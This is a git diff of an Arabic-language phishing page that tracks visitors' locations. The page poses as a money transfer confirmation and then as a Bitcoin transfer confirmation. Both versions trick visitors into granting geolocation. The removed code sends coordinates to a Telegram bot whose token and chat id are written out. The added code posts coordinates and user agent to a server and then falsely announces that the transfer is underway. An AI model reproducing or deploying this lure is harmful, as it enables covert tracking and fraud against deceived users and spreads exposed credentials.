@@ -1,59 +1,45 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>وائل الغالي</title>
+  <title>Bitcoin Transfer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: Arial; text-align: center; margin-top: 100px; background-color: #f1f1f1; }
-    h1 { color: #0088cc; }
-    button {
-      padding: 15px 30px;
-      font-size: 18px;
-      background-color: #0088cc;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
+    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+    .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+    button { padding: 12px 25px; background-color: #f7931a; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h1>مجموعة وائل الغالي</h1>
-  <p>يرجى تأكيد تحويل المال بالضغط على الزر أدناه:</p>
-  <button onclick="getLocation()">تأكيد تحويل المال</button>
+  <div class="card">
+    <h2>🔐 تأكيد تحويل البيتكوين</h2>
+    <p>الرجاء تأكيد موقعك الجغرافي لضمان الأمان قبل إتمام التحويل</p>
+    <button onclick="getLocation()">تأكيد</button>
+  </div>
 
   <script>
-    function sendLocation(lat, lon) {
-      const token = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0';
-      const chatId = '5931662777';
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      const data = {
-        chat_id: chatId,
-        text: `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lon}`
-      };
-
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-    }
-
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            sendLocation(lat, lon);
-          },
-          function(error) {
-            console.error("فشل في الحصول على الموقع:", error);
-          }
-        );
+        navigator.geolocation.getCurrentPosition(sendData, () => {
+          alert("❌ لا يمكن إتمام التحويل بدون إذن الموقع.");
+        });
       } else {
-        console.log("المتصفح لا يدعم GPS");
+        alert("🌐 متصفحك لا يدعم تحديد الموقع.");
       }
+    }
+
+    function sendData(position) {
+      fetch("/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          userAgent: navigator.userAgent
+        })
+      }).then(() => {
+        alert("✅ تم تأكيد العملية. سيتم تحويل المبلغ خلال دقائق.");
+      });
     }
   </script>
 </body>
